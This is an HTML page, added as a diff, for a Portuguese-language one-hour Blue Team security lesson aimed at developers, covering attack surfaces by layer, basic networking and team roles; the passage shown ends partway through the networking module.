@@ -1,0 +1,1501 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blue Team para Devs — Aula de 1h</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Space+Grotesk:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0c10;
+  --bg2: #10141c;
+  --bg3: #161b26;
+  --border: rgba(255,255,255,0.07);
+  --border2: rgba(255,255,255,0.13);
+  --text: #e8eaf0;
+  --muted: #6b7280;
+  --dim: #3d4456;
+
+  --blue: #3b82f6;
+  --blue-dim: rgba(59,130,246,0.12);
+  --blue-border: rgba(59,130,246,0.3);
+  --teal: #14b8a6;
+  --teal-dim: rgba(20,184,166,0.1);
+  --amber: #f59e0b;
+  --amber-dim: rgba(245,158,11,0.1);
+  --red: #ef4444;
+  --red-dim: rgba(239,68,68,0.1);
+  --green: #22c55e;
+  --purple: #a78bfa;
+  --purple-dim: rgba(167,139,250,0.1);
+  --coral: #fb7185;
+
+  --mono: 'IBM Plex Mono', monospace;
+  --sans: 'Space Grotesk', sans-serif;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* NOISE TEXTURE */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+  pointer-events: none; z-index: 0; opacity: 0.4;
+}
+
+/* GRID LINES */
+body::after {
+  content: '';
+  position: fixed; inset: 0;
+  background-image:
+    linear-gradient(rgba(59,130,246,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(59,130,246,0.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none; z-index: 0;
+}
+
+/* LAYOUT */
+.page { position: relative; z-index: 1; }
+
+/* ─── HEADER ─── */
+header {
+  padding: 2rem 2rem 0;
+  max-width: 1100px; margin: 0 auto;
+}
+
+.header-top {
+  display: flex; align-items: center; justify-content: space-between;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 1rem; margin-bottom: 1.5rem;
+}
+
+.logo {
+  font-family: var(--mono);
+  font-size: 11px; font-weight: 500;
+  color: var(--blue);
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  display: flex; align-items: center; gap: 8px;
+}
+
+.logo::before {
+  content: '';
+  width: 8px; height: 8px; border-radius: 50%;
+  background: var(--blue);
+  box-shadow: 0 0 12px var(--blue);
+  animation: blink 2s ease-in-out infinite;
+}
+
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+.timer-badge {
+  font-family: var(--mono);
+  font-size: 11px; color: var(--muted);
+  border: 1px solid var(--border2);
+  padding: 4px 10px; border-radius: 20px;
+}
+
+h1 {
+  font-size: clamp(2rem, 5vw, 3.5rem);
+  font-weight: 600;
+  line-height: 1.1;
+  letter-spacing: -0.02em;
+  margin-bottom: .5rem;
+}
+
+h1 span { color: var(--blue); }
+
+.tagline {
+  font-size: 15px; color: var(--muted);
+  font-weight: 300;
+  margin-bottom: 2rem;
+}
+
+/* ─── NAV TABS ─── */
+.tab-nav {
+  display: flex; gap: 2px;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 4px;
+  overflow-x: auto;
+  scrollbar-width: none;
+  max-width: 1100px; margin: 0 auto 2rem;
+}
+
+.tab-nav::-webkit-scrollbar { display: none; }
+
+.tab-btn {
+  flex: none;
+  display: flex; flex-direction: column; align-items: center; gap: 2px;
+  padding: 8px 14px;
+  border: none; background: transparent;
+  color: var(--muted);
+  font-family: var(--sans); font-size: 12px; font-weight: 400;
+  border-radius: 8px; cursor: pointer;
+  transition: all .2s; white-space: nowrap;
+}
+
+.tab-btn .time {
+  font-family: var(--mono); font-size: 10px; color: var(--dim);
+}
+
+.tab-btn:hover { color: var(--text); background: var(--bg3); }
+
+.tab-btn.active {
+  background: var(--blue);
+  color: #fff;
+}
+
+.tab-btn.active .time { color: rgba(255,255,255,0.6); }
+
+/* ─── SECTIONS ─── */
+main {
+  max-width: 1100px; margin: 0 auto;
+  padding: 0 2rem 4rem;
+}
+
+.section { display: none; animation: fadeUp .3s ease; }
+.section.active { display: block; }
+
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.section-header {
+  display: flex; align-items: flex-start; gap: 1.5rem;
+  margin-bottom: 2rem;
+  padding-bottom: 1.5rem;
+  border-bottom: 1px solid var(--border);
+}
+
+.section-num {
+  font-family: var(--mono);
+  font-size: 48px; font-weight: 600;
+  color: var(--border2);
+  line-height: 1;
+  flex-shrink: 0;
+}
+
+.section-meta h2 {
+  font-size: 1.6rem; font-weight: 600;
+  letter-spacing: -0.01em; margin-bottom: .25rem;
+}
+
+.section-meta .desc {
+  font-size: 14px; color: var(--muted); line-height: 1.6;
+  max-width: 600px;
+}
+
+/* ─── GRID LAYOUTS ─── */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+.grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; }
+
+@media (max-width: 768px) {
+  .grid-2, .grid-3 { grid-template-columns: 1fr; }
+}
+
+/* ─── CARDS ─── */
+.card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 1.25rem;
+  transition: border-color .2s;
+}
+
+.card:hover { border-color: var(--border2); }
+
+.card-label {
+  font-family: var(--mono); font-size: 10px;
+  letter-spacing: .1em; text-transform: uppercase;
+  color: var(--muted); margin-bottom: .5rem;
+}
+
+.card h3 { font-size: 15px; font-weight: 500; margin-bottom: .4rem; }
+.card p { font-size: 13px; color: var(--muted); line-height: 1.6; }
+
+.card.blue { border-color: var(--blue-border); background: var(--blue-dim); }
+.card.teal { border-color: rgba(20,184,166,.3); background: var(--teal-dim); }
+.card.amber { border-color: rgba(245,158,11,.3); background: var(--amber-dim); }
+.card.red { border-color: rgba(239,68,68,.3); background: var(--red-dim); }
+.card.purple { border-color: rgba(167,139,250,.3); background: var(--purple-dim); }
+
+/* ─── DIAGRAM / FLOW ─── */
+.flow {
+  display: flex; align-items: center; gap: 0;
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1.5rem;
+  overflow-x: auto; margin-bottom: 1rem;
+}
+
+.flow-node {
+  flex-shrink: 0;
+  display: flex; flex-direction: column; align-items: center;
+  gap: 4px;
+}
+
+.flow-box {
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+  padding: 8px 16px;
+  font-family: var(--mono); font-size: 12px;
+  white-space: nowrap;
+}
+
+.flow-box.blue { border-color: var(--blue-border); color: var(--blue); }
+.flow-box.teal { border-color: rgba(20,184,166,.4); color: var(--teal); }
+.flow-box.purple { border-color: rgba(167,139,250,.4); color: var(--purple); }
+.flow-box.amber { border-color: rgba(245,158,11,.4); color: var(--amber); }
+.flow-box.red { border-color: rgba(239,68,68,.4); color: var(--red); }
+
+.flow-label { font-size: 10px; color: var(--dim); font-family: var(--mono); }
+
+.flow-arrow {
+  flex-shrink: 0;
+  width: 40px; height: 1px;
+  background: var(--border2);
+  position: relative; margin: 0 4px;
+  align-self: center; margin-bottom: 18px;
+}
+
+.flow-arrow::after {
+  content: '';
+  position: absolute; right: -1px; top: -4px;
+  border: 4px solid transparent;
+  border-left: 6px solid var(--border2);
+}
+
+/* ─── ATTACK TABLE ─── */
+.atk-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+}
+
+.atk-table thead tr {
+  border-bottom: 1px solid var(--border2);
+}
+
+.atk-table th {
+  font-family: var(--mono); font-size: 10px;
+  letter-spacing: .1em; text-transform: uppercase;
+  color: var(--muted); padding: 10px 14px;
+  text-align: left; font-weight: 400;
+}
+
+.atk-table td {
+  padding: 12px 14px;
+  border-bottom: 1px solid var(--border);
+  color: var(--text);
+}
+
+.atk-table tr:last-child td { border-bottom: none; }
+.atk-table tr:hover td { background: var(--bg3); }
+
+.atk-table .layer {
+  font-family: var(--mono); font-size: 12px;
+  font-weight: 500;
+}
+
+.badge {
+  display: inline-block;
+  font-family: var(--mono); font-size: 10px;
+  padding: 2px 8px; border-radius: 20px;
+  font-weight: 500;
+}
+
+.badge-red { background: var(--red-dim); color: var(--red); border: 1px solid rgba(239,68,68,.25); }
+.badge-amber { background: var(--amber-dim); color: var(--amber); border: 1px solid rgba(245,158,11,.25); }
+.badge-blue { background: var(--blue-dim); color: var(--blue); border: 1px solid var(--blue-border); }
+.badge-teal { background: var(--teal-dim); color: var(--teal); border: 1px solid rgba(20,184,166,.25); }
+
+/* ─── CODE BLOCK ─── */
+.code-block {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  font-family: var(--mono); font-size: 12.5px;
+  line-height: 1.8; color: var(--text);
+  overflow-x: auto;
+  position: relative;
+}
+
+.code-block .cm { color: var(--dim); }
+.code-block .kw { color: var(--blue); }
+.code-block .st { color: var(--teal); }
+.code-block .vr { color: var(--amber); }
+.code-block .er { color: var(--red); }
+.code-block .ok { color: var(--green); }
+
+.code-tag {
+  position: absolute; top: 8px; right: 10px;
+  font-size: 10px; color: var(--dim);
+  letter-spacing: .05em;
+}
+
+/* ─── INSIGHT BOX ─── */
+.insight {
+  display: flex; gap: 12px; align-items: flex-start;
+  background: var(--blue-dim);
+  border: 1px solid var(--blue-border);
+  border-radius: 10px; padding: 1rem 1.25rem;
+  margin: 1rem 0; font-size: 13.5px; line-height: 1.6;
+}
+
+.insight::before {
+  content: '→';
+  font-family: var(--mono); color: var(--blue);
+  font-weight: 600; flex-shrink: 0; margin-top: 1px;
+}
+
+/* ─── STEPS ─── */
+.steps { display: flex; flex-direction: column; gap: 0; }
+
+.step {
+  display: flex; gap: 1rem; align-items: flex-start;
+  padding: 1rem 0;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+}
+
+.step:last-child { border-bottom: none; }
+
+.step-num {
+  width: 28px; height: 28px;
+  border-radius: 50%;
+  background: var(--bg3); border: 1px solid var(--border2);
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--mono); font-size: 11px; font-weight: 600;
+  color: var(--blue); flex-shrink: 0;
+}
+
+.step-content h4 { font-size: 14px; font-weight: 500; margin-bottom: 3px; }
+.step-content p { font-size: 12px; color: var(--muted); line-height: 1.5; }
+
+/* ─── TCP DIAGRAM ─── */
+.tcp-diagram {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1.5rem;
+}
+
+.tcp-row {
+  display: flex; align-items: center;
+  gap: 8px; margin: 1rem 0;
+  font-size: 12px; font-family: var(--mono);
+}
+
+.tcp-end {
+  width: 90px; flex-shrink: 0;
+  background: var(--bg3); border: 1px solid var(--border2);
+  padding: 6px 10px; border-radius: 6px;
+  font-size: 11px; text-align: center;
+}
+
+.tcp-arrow {
+  flex: 1; height: 2px; position: relative;
+}
+
+.tcp-arrow span {
+  position: absolute; left: 50%; transform: translateX(-50%);
+  top: -18px;
+  font-size: 10px; letter-spacing: .05em;
+  white-space: nowrap;
+}
+
+.tcp-arrow.right {
+  background: linear-gradient(90deg, transparent, var(--blue));
+}
+.tcp-arrow.right::after {
+  content: ''; position: absolute; right: -1px; top: -4px;
+  border: 5px solid transparent; border-left: 7px solid var(--blue);
+}
+
+.tcp-arrow.left {
+  background: linear-gradient(270deg, transparent, var(--teal));
+}
+.tcp-arrow.left::before {
+  content: ''; position: absolute; left: -1px; top: -4px;
+  border: 5px solid transparent; border-right: 7px solid var(--teal);
+}
+
+/* ─── HASH DEMO ─── */
+.hash-demo {
+  display: flex; align-items: center; gap: 12px;
+  flex-wrap: wrap;
+}
+
+.hash-demo input {
+  flex: 1; min-width: 180px;
+  background: var(--bg3); border: 1px solid var(--border2);
+  border-radius: 8px; padding: 10px 14px;
+  font-family: var(--mono); font-size: 13px; color: var(--text);
+  outline: none; transition: border-color .2s;
+}
+
+.hash-demo input:focus { border-color: var(--blue-border); }
+
+.hash-result {
+  flex: 2; min-width: 200px;
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px 14px;
+  font-family: var(--mono); font-size: 11px;
+  color: var(--teal); word-break: break-all; line-height: 1.4;
+}
+
+/* ─── CLOUD DIAGRAM ─── */
+.cloud-diagram {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1.5rem;
+}
+
+.vpc {
+  border: 1px dashed var(--blue-border);
+  border-radius: 12px; padding: 1rem;
+  background: var(--blue-dim);
+  margin-bottom: 1rem;
+}
+
+.vpc-label {
+  font-family: var(--mono); font-size: 10px;
+  color: var(--blue); letter-spacing: .1em;
+  text-transform: uppercase; margin-bottom: .75rem;
+}
+
+.subnet-row { display: grid; grid-template-columns: 1fr 1fr; gap: .75rem; }
+
+.subnet {
+  border: 1px dashed var(--border2);
+  border-radius: 8px; padding: .75rem;
+}
+
+.subnet.pub { border-color: rgba(20,184,166,.3); background: var(--teal-dim); }
+.subnet.priv { border-color: rgba(167,139,250,.3); background: var(--purple-dim); }
+
+.subnet-label {
+  font-family: var(--mono); font-size: 9px;
+  text-transform: uppercase; letter-spacing: .1em;
+  margin-bottom: .5rem;
+}
+
+.subnet.pub .subnet-label { color: var(--teal); }
+.subnet.priv .subnet-label { color: var(--purple); }
+
+.sg-box {
+  background: var(--bg3); border: 1px solid var(--border2);
+  border-radius: 6px; padding: 6px 10px;
+  font-family: var(--mono); font-size: 11px;
+  margin-bottom: .4rem;
+}
+
+.sg-box.danger { border-color: rgba(239,68,68,.4); background: var(--red-dim); color: var(--red); }
+.sg-box span { float: right; }
+.sg-ok { color: var(--green); }
+.sg-bad { color: var(--red); }
+
+/* ─── SOC STACK ─── */
+.soc-table {
+  width: 100%; border-collapse: collapse; font-size: 13px;
+}
+
+.soc-table td, .soc-table th {
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border);
+  text-align: left;
+}
+
+.soc-table th {
+  font-family: var(--mono); font-size: 10px;
+  letter-spacing: .1em; color: var(--muted);
+  font-weight: 400; background: var(--bg2);
+}
+
+.soc-table td:first-child {
+  font-family: var(--mono); font-weight: 500; color: var(--blue);
+}
+
+/* ─── PYRAMID ─── */
+.pyramid { display: flex; flex-direction: column; gap: 4px; }
+
+.pyr-level {
+  display: flex; align-items: center; gap: 12px;
+  padding: 12px 16px; border-radius: 8px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  cursor: pointer; transition: all .2s;
+}
+
+.pyr-level:hover { border-color: var(--border2); background: var(--bg3); }
+
+.pyr-level:nth-child(1) { border-left: 3px solid var(--red); }
+.pyr-level:nth-child(2) { border-left: 3px solid var(--coral); }
+.pyr-level:nth-child(3) { border-left: 3px solid var(--amber); }
+.pyr-level:nth-child(4) { border-left: 3px solid var(--teal); }
+.pyr-level:nth-child(5) { border-left: 3px solid var(--blue); }
+
+.pyr-pain {
+  font-family: var(--mono); font-size: 10px;
+  width: 80px; text-align: center; flex-shrink: 0;
+  padding: 3px 8px; border-radius: 20px;
+}
+
+.pyr-pain.hard { background: var(--red-dim); color: var(--red); }
+.pyr-pain.med { background: var(--amber-dim); color: var(--amber); }
+.pyr-pain.easy { background: var(--blue-dim); color: var(--blue); }
+
+.pyr-title { font-size: 14px; font-weight: 500; flex: 1; }
+.pyr-desc { font-size: 12px; color: var(--muted); }
+
+/* ─── CLOSING MAP ─── */
+.closing-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 1rem;
+  margin-bottom: 1rem;
+}
+
+@media (max-width: 768px) {
+  .closing-grid { grid-template-columns: 1fr; }
+}
+
+.closing-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1.25rem;
+  transition: border-color .2s, transform .2s;
+}
+
+.closing-card:hover { border-color: var(--border2); transform: translateY(-2px); }
+
+.closing-card .icon {
+  width: 36px; height: 36px; border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 18px; margin-bottom: .75rem;
+}
+
+.closing-card h3 { font-size: 14px; font-weight: 500; margin-bottom: 4px; }
+.closing-card p { font-size: 12px; color: var(--muted); line-height: 1.5; }
+
+/* ─── SUMMARY BOARD ─── */
+.summary-board {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+}
+
+.summary-head {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: .85rem 1rem;
+  border-bottom: 1px solid var(--border);
+  background: linear-gradient(90deg, rgba(59,130,246,.12), rgba(20,184,166,.08));
+}
+
+.summary-title {
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: .08em;
+  text-transform: uppercase;
+  color: var(--blue);
+}
+
+.summary-sub {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--dim);
+}
+
+.summary-rows {
+  display: grid;
+  grid-template-columns: 1fr;
+}
+
+.summary-row {
+  display: grid;
+  grid-template-columns: 110px 1fr;
+  gap: 12px;
+  align-items: start;
+  padding: .75rem 1rem;
+  border-bottom: 1px solid var(--border);
+}
+
+.summary-row:last-child {
+  border-bottom: none;
+}
+
+.summary-key {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--text);
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  border-radius: 999px;
+  padding: 4px 10px;
+  text-align: center;
+  white-space: nowrap;
+}
+
+.summary-value {
+  font-size: 13px;
+  line-height: 1.55;
+  color: var(--muted);
+}
+
+.summary-value strong {
+  color: var(--text);
+  font-weight: 500;
+}
+
+.summary-quote {
+  margin: .9rem 1rem 1rem;
+  background: var(--teal-dim);
+  border: 1px solid rgba(20,184,166,.32);
+  border-radius: 8px;
+  padding: .8rem .9rem;
+  color: var(--teal);
+  font-family: var(--mono);
+  font-size: 12px;
+}
+
+@media (max-width: 700px) {
+  .summary-row {
+    grid-template-columns: 1fr;
+    gap: 8px;
+  }
+
+  .summary-key {
+    width: fit-content;
+  }
+}
+
+/* ─── SEPARATOR ─── */
+.sep {
+  height: 1px; background: var(--border);
+  margin: 1.5rem 0;
+}
+
+/* ─── SCROLLBAR ─── */
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 4px; }
+
+/* ─── PROGRESS BAR ─── */
+.progress-bar {
+  position: fixed; top: 0; left: 0;
+  height: 2px; background: var(--blue);
+  box-shadow: 0 0 8px var(--blue);
+  transition: width .3s ease;
+  z-index: 100;
+}
+
+/* ─── FOOTER ─── */
+footer {
+  text-align: center; padding: 2rem;
+  font-family: var(--mono); font-size: 11px;
+  color: var(--dim);
+  border-top: 1px solid var(--border);
+  max-width: 1100px; margin: 0 auto;
+}
+
+/* ─── RESPONSIVE ─── */
+@media (max-width: 600px) {
+  header, main { padding: 1rem; }
+  .tab-nav { margin: 0 1rem 1.5rem; }
+  h1 { font-size: 1.8rem; }
+  .section-num { display: none; }
+}
+
+/* ─── HOVER UNDERLINE ─── */
+.hlabel {
+  display: inline-block;
+  border-bottom: 1px dashed var(--border2);
+  padding-bottom: 1px; cursor: help;
+  color: var(--text);
+}
+
+.hlabel:hover { border-color: var(--blue); color: var(--blue); }
+</style>
+</head>
+<body>
+<div class="page">
+
+<div class="progress-bar" id="progress"></div>
+
+<!-- HEADER -->
+<header>
+  <div class="header-top">
+    <div class="logo">Blue Team · Dev Edition</div>
+    <div class="timer-badge">1h · 7 módulos</div>
+  </div>
+  <h1>Segurança não é<br>ferramenta. É entender<br>onde sistemas <span>quebram</span>.</h1>
+  <p class="tagline">Roteiro completo de aula — Blue Team para desenvolvedores full-stack e devops</p>
+</header>
+
+<!-- NAV -->
+<div class="tab-nav" id="tabNav">
+  <button class="tab-btn active" onclick="showTab(0)">
+    Abertura
+    <span class="time">0–5 min</span>
+  </button>
+  <button class="tab-btn" onclick="showTab(1)">
+    Infra & Ataque
+    <span class="time">5–15 min</span>
+  </button>
+  <button class="tab-btn" onclick="showTab(2)">
+    Redes
+    <span class="time">15–25 min</span>
+  </button>
+  <button class="tab-btn" onclick="showTab(3)">
+    Criptografia
+    <span class="time">25–35 min</span>
+  </button>
+  <button class="tab-btn" onclick="showTab(4)">
+    Cloud
+    <span class="time">35–45 min</span>
+  </button>
+  <button class="tab-btn" onclick="showTab(5)">
+    SOC
+    <span class="time">45–55 min</span>
+  </button>
+  <button class="tab-btn" onclick="showTab(6)">
+    Fechamento
+    <span class="time">55–60 min</span>
+  </button>
+</div>
+
+<main>
+
+<!-- ═══════════ 0 — ABERTURA ═══════════ -->
+<div class="section active" id="s0">
+  <div class="section-header">
+    <div class="section-num">00</div>
+    <div class="section-meta">
+      <h2>Abertura - Impacto imediato</h2>
+      <p class="desc">Comece com risco real, perda real e tempo real. Nos primeiros 60 segundos, a turma precisa sentir que isso pode acontecer hoje.</p>
+    </div>
+  </div>
+
+  <div class="insight">
+    "Se seu sistema cair 20 minutos numa segunda-feira, você perde cliente, dinheiro e confiança. Blue Team existe para impedir que um ataque vire crise de negócio."
+  </div>
+
+  <div class="sep"></div>
+
+  <h3 style="font-size:13px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:1rem">FLUXO BÁSICO — ONDE ISSO QUEBRA?</h3>
+
+  <div class="flow">
+    <div class="flow-node">
+      <div class="flow-box blue">Usuário</div>
+      <div class="flow-label">quem usa</div>
+    </div>
+    <div class="flow-arrow"></div>
+    <div class="flow-node">
+      <div class="flow-box">Internet</div>
+      <div class="flow-label">tráfego</div>
+    </div>
+    <div class="flow-arrow"></div>
+    <div class="flow-node">
+      <div class="flow-box teal">Backend API</div>
+      <div class="flow-label">lógica</div>
+    </div>
+    <div class="flow-arrow"></div>
+    <div class="flow-node">
+      <div class="flow-box purple">Banco de Dados</div>
+      <div class="flow-label">dados</div>
+    </div>
+  </div>
+
+  <div class="sep"></div>
+
+  <div class="grid-3">
+    <div class="card blue">
+      <div class="card-label">Blue Team</div>
+      <h3 style="color:var(--blue)">Defesa ativa</h3>
+      <p>Detecta, responde e previne ataques em sistemas reais em produção.</p>
+    </div>
+    <div class="card teal">
+      <div class="card-label">Red Team</div>
+      <h3 style="color:var(--teal)">Ataque simulado</h3>
+      <p>Simula ataques reais para encontrar falhas antes do atacante verdadeiro.</p>
+    </div>
+    <div class="card purple">
+      <div class="card-label">Purple Team</div>
+      <h3 style="color:var(--purple)">Red + Blue juntos</h3>
+      <p>Ataque com feedback contínuo de defesa — ciclo de melhoria acelerado.</p>
+    </div>
+  </div>
+
+  <div class="sep"></div>
+
+  <div class="insight">
+    O atacante não precisa invadir todos os pontos. Basta encontrar <strong>um</strong> ponto fraco.
+    Blue Team precisa defender <strong>todos</strong> ao mesmo tempo.
+  </div>
+</div>
+
+<!-- ═══════════ 1 — INFRA ═══════════ -->
+<div class="section" id="s1">
+  <div class="section-header">
+    <div class="section-num">01</div>
+    <div class="section-meta">
+      <h2>Infra & Superfície de Ataque</h2>
+      <p class="desc">Cada camada do sistema moderno é um ponto de entrada potencial. Blue Team começa na arquitetura, não no SOC.</p>
+    </div>
+  </div>
+
+  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:1rem">
+    <table class="atk-table">
+      <thead>
+        <tr>
+          <th>Camada</th>
+          <th>Tecnologia</th>
+          <th>Vetor de ataque</th>
+          <th>Severidade</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="layer" style="color:var(--blue)">Frontend</span></td>
+          <td style="color:var(--muted);font-family:var(--mono);font-size:12px">React / Vue / Angular</td>
+          <td>XSS, CSRF, clickjacking, injeção de script via inputs não sanitizados</td>
+          <td><span class="badge badge-amber">Alta</span></td>
+        </tr>
+        <tr>
+          <td><span class="layer" style="color:var(--teal)">API</span></td>
+          <td style="color:var(--muted);font-family:var(--mono);font-size:12px">REST / GraphQL</td>
+          <td>Auth bypass, IDOR, SQLi, mass assignment, rate limit ausente</td>
+          <td><span class="badge badge-red">Crítica</span></td>
+        </tr>
+        <tr>
+          <td><span class="layer" style="color:var(--purple)">Banco</span></td>
+          <td style="color:var(--muted);font-family:var(--mono);font-size:12px">Postgres / MySQL / Mongo</td>
+          <td>SQL Injection, credencial vazada, dump completo, permissões excessivas</td>
+          <td><span class="badge badge-red">Crítica</span></td>
+        </tr>
+        <tr>
+          <td><span class="layer" style="color:var(--amber)">Rede</span></td>
+          <td style="color:var(--muted);font-family:var(--mono);font-size:12px">Load balancer / DNS</td>
+          <td>DDoS, man-in-the-middle, port scan, DNS hijacking, BGP spoofing</td>
+          <td><span class="badge badge-amber">Alta</span></td>
+        </tr>
+        <tr>
+          <td><span class="layer" style="color:var(--coral)">Cloud</span></td>
+          <td style="color:var(--muted);font-family:var(--mono);font-size:12px">AWS / GCP / Azure</td>
+          <td>Credencial vazada, bucket público, porta aberta, IAM excessivo</td>
+          <td><span class="badge badge-red">Crítica</span></td>
+        </tr>
+        <tr>
+          <td><span class="layer" style="color:var(--muted)">CI/CD</span></td>
+          <td style="color:var(--muted);font-family:var(--mono);font-size:12px">GitHub Actions / Jenkins</td>
+          <td>Supply chain attack, segredo em env var, dependência comprometida</td>
+          <td><span class="badge badge-amber">Alta</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="insight">
+    "Blue Team não começa no SOC. Começa na <strong>arquitetura</strong>." — a superfície de ataque é definida nas decisões de design, não depois do deploy.
+  </div>
+
+  <div class="sep"></div>
+
+  <h3 style="font-size:13px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:1rem">STACK COMPLETA COM PONTOS DE FALHA</h3>
+
+  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:1.5rem">
+    <div style="display:flex;flex-direction:column;gap:0;max-width:360px;margin:0 auto">
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 0">
+        <div style="background:var(--bg3);border:1px solid rgba(59,130,246,.4);border-radius:7px;padding:7px 16px;font-family:var(--mono);font-size:12px;color:var(--blue);width:160px;text-align:center">React (SPA)</div>
+        <div style="font-size:12px;color:var(--muted)">→ XSS · CSRF</div>
+      </div>
+      <div style="width:1px;height:20px;background:var(--border2);margin-left:79px"></div>
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 0">
+        <div style="background:var(--bg3);border:1px solid rgba(59,130,246,.3);border-radius:7px;padding:7px 16px;font-family:var(--mono);font-size:12px;width:160px;text-align:center">HTTPS</div>
+        <div style="font-size:12px;color:var(--muted)">→ protege conteúdo, não comportamento</div>
+      </div>
+      <div style="width:1px;height:20px;background:var(--border2);margin-left:79px"></div>
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 0">
+        <div style="background:var(--bg3);border:1px solid rgba(20,184,166,.4);border-radius:7px;padding:7px 16px;font-family:var(--mono);font-size:12px;color:var(--teal);width:160px;text-align:center">Load Balancer</div>
+        <div style="font-size:12px;color:var(--muted)">→ DDoS · SYN flood</div>
+      </div>
+      <div style="width:1px;height:20px;background:var(--border2);margin-left:79px"></div>
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 0">
+        <div style="background:var(--bg3);border:1px solid rgba(20,184,166,.4);border-radius:7px;padding:7px 16px;font-family:var(--mono);font-size:12px;color:var(--teal);width:160px;text-align:center">Backend API</div>
+        <div style="font-size:12px;color:var(--muted)">→ auth bypass · IDOR</div>
+      </div>
+      <div style="width:1px;height:20px;background:var(--border2);margin-left:79px"></div>
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 0">
+        <div style="background:var(--bg3);border:1px solid rgba(167,139,250,.4);border-radius:7px;padding:7px 16px;font-family:var(--mono);font-size:12px;color:var(--purple);width:160px;text-align:center">Database</div>
+        <div style="font-size:12px;color:var(--muted)">→ SQLi · dump</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════ 2 — REDES ═══════════ -->
+<div class="section" id="s2">
+  <div class="section-header">
+    <div class="section-num">02</div>
+    <div class="section-meta">
+      <h2>Redes — só o necessário</h2>
+      <p class="desc">IP, porta, TCP handshake e DNS — o mínimo para detectar tráfego suspeito e reconhecer padrões de ataque na prática.</p>
+    </div>
+  </div>
+
+  <div class="grid-2" style="margin-bottom:1rem">
+    <div>
+      <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.5rem">IP + PORTA</p>
+      <div class="code-block">
+<span class="code-tag">conceito</span>
+<span class="cm"># IP = endereço de quem</span>
+<span class="vr">192.168.1.1</span>     <span class="cm">→ máquina na rede</span>
+
+<span class="cm"># Porta = qual serviço</span>
+:<span class="kw">443</span>  → HTTPS
+:<span class="kw">22</span>   → SSH
+:<span class="kw">3306</span> → MySQL
+:<span class="kw">6379</span> → Redis
+:<span class="kw">27017</span>→ MongoDB
+      </div>
+    </div>
+    <div>
+      <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.5rem">DNS</p>
+      <div class="code-block">
+<span class="code-tag">resolução</span>
+<span class="vr">google.com</span>
+    ↓ consulta DNS
+<span class="ok">142.250.79.46</span>
+
